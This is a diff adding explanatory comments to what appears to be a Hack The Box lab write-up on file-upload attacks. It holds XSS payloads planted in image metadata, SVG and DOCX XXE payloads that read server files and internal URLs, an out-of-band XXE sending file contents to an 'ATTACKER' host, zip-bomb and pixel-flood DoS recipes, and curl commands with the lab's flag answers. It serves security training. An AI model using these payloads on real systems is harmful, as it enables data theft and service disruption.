@@ -47,6 +47,7 @@ When the app displays image metadata:
 exiftool -Comment='"><img src=1 onerror=alert(document.cookie)>' photo.jpg
 exiftool -Artist='<script>alert(1)</script>' photo.jpg
 ```
+> Writes a cross-site scripting (XSS) payload into the image metadata fields. If the site displays the Comment or Artist field in HTML, the script runs in the viewer's browser.
 
 Anywhere the comment/artist field is rendered → XSS fires.
 
@@ -64,6 +65,7 @@ This is the **gold attack** when only SVG is allowed.
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
 ```
+> When the server parses this SVG, `&xxe;` resolves to the file's contents and appears in the rendered output. Works when the server uses an XML parser to process SVG files.
 
 When the server parses + renders the SVG, `&xxe;` resolves to the file's contents → embedded in the rendered output.
 
@@ -73,6 +75,7 @@ When the server parses + renders the SVG, `&xxe;` resolves to the file's content
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
 <svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
 ```
+> The `php://filter` wrapper base64-encodes the file so it survives XML parsing. Decode the output with `base64 -d` to read the raw PHP source.
 
 The wrapper base64-encodes the file content so it survives XML parsing without breaking. Decode the result with `base64 -d`.
 
@@ -82,6 +85,7 @@ The wrapper base64-encodes the file content so it survives XML parsing without b
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://internal-service:8080/admin"> ]>
 <svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
 ```
+> Uses XML External Entity (XXE) to make the server send a request to an internal address. This is Server-Side Request Forgery (SSRF) — useful for hitting internal services not reachable from the internet.
 
 ### Out-of-Band XXE (when entity body isn't reflected)
 ```xml
@@ -93,12 +97,14 @@ The wrapper base64-encodes the file content so it survives XML parsing without b
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">&exfil;</svg>
 ```
+> Out-of-band XXE exfiltrates data to your server when the response does not reflect the entity value. The server fetches your `evil.dtd` file and then sends a request containing the stolen file contents.
 
 Where `evil.dtd` on your server contains:
 ```xml
 <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER/?d=%file;'>">
 %all;
 ```
+> The external Document Type Definition (DTD) builds the exfiltration entity dynamically. Host this on your attacker machine and watch for inbound requests containing the file contents.
 
 ---
 
@@ -114,6 +120,7 @@ zip bomb2.zip bomb.zip
 zip bomb3.zip bomb2.zip
 # Repeat — final ~10KB → unzipped petabytes
 ```
+> Creates a zip bomb by nesting compressed files. A tiny file unzips into enormous data, crashing the server if it tries to decompress without size limits.
 
 ### Pixel flood (image format DoS)
 Manually edit a JPG/PNG's dimensions header to claim 65535×65535 pixels. When the server's image library tries to allocate buffer space, it crashes.
@@ -142,6 +149,7 @@ unzip doc.docx -d doc_dir
 # Reference &xxe; somewhere in the body
 cd doc_dir && zip -r ../malicious.docx .
 ```
+> Unpacks the DOCX (which is just a ZIP of XML files), injects an XXE payload into the document XML, then repacks it. Any server that parses the document for a preview will trigger the XXE.
 
 Upload + any office-doc viewer / preview that parses XML → XXE fires.
 
@@ -173,6 +181,7 @@ curl -sk -X POST "http://154.57.164.75:30664/upload.php" -F "uploadFile=@/tmp/fl
 curl -sk "http://154.57.164.75:30664/" | grep -oE 'HTB\{[^}]+\}'
 # → HTB{my_1m4635_4r3_l37h4l}
 ```
+> Creates an SVG with an XXE payload reading `/flag.txt`. The main page renders the SVG and the entity resolves to the file contents. `grep -oE` extracts just the flag string from the HTML.
 
 **Q1 Answer:** `HTB{my_1m4635_4r3_l37h4l}`
 
@@ -190,6 +199,7 @@ curl -sk -X POST "http://154.57.164.75:30664/upload.php" -F "uploadFile=@/tmp/so
 # Get base64 from main page render + decode
 curl -sk "http://154.57.164.75:30664/" | grep -oP 'PD9w[A-Za-z0-9+/=]+' | tail -1 | base64 -d
 ```
+> Reads the upload.php source via a `php://filter` XXE payload. The base64 string starting with `PD9w` is the encoded PHP opening tag (`<?ph`). Decode it to see the full source code including the upload directory path.
 
 Result:
 ```php
